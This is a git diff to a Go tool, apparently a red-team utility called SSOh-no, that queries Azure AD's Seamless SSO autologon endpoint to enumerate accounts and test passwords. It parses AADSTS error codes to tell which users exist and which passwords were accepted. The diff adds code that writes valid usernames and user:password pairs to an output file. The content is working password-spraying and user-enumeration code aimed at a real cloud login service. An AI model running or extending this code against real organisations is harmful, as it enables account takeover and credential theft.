@@ -10,9 +10,10 @@ import (
 
 	"github.com/google/uuid"
 	colour "github.com/logrusorgru/aurora/v3"
+	service "github.com/optionalCTF/SSOh-no/pkg/svc"
 )
 
-func Query(user string, domain string, password string, wg *sync.WaitGroup) {
+func Query(user string, domain string, password string, wg *sync.WaitGroup, outfile string) {
 	tar := "https://autologon.microsoftazuread-sso.com/" + domain + "/winauth/trust/2005/usernamemixed?client-request-id=" + uuid.New().String()
 	// This is disgusting, look at better solution?
 	var body = strings.NewReader(`<?xml version="1.0" encoding="UTF-8"?>
@@ -70,12 +71,16 @@ func Query(user string, domain string, password string, wg *sync.WaitGroup) {
 
 	if strings.Contains(string(data), "DesktopSsoToken") {
 		fmt.Println(colour.Green("[+] Email Exists: " + user + " \n\r[+] Password Accepted: " + password))
+		userPass := user + ":" + password
+		service.WriteFile(outfile, userPass)
 	} else if strings.Contains(string(data), "AADSTS50034") {
 		fmt.Println(colour.Red("[-] " + user + " does not exist"))
 	} else if strings.Contains(string(data), "AADSTS50126") && password != "" {
 		fmt.Println(colour.Green("[+] " + user + " exists"))
+		service.WriteFile(outfile, user)
 		fmt.Println(colour.Red("[-] Password Incorrect"))
 	} else {
+		service.WriteFile(outfile, user)
 		fmt.Println(colour.Green("[+] " + user + " exists"))
 	}
 }
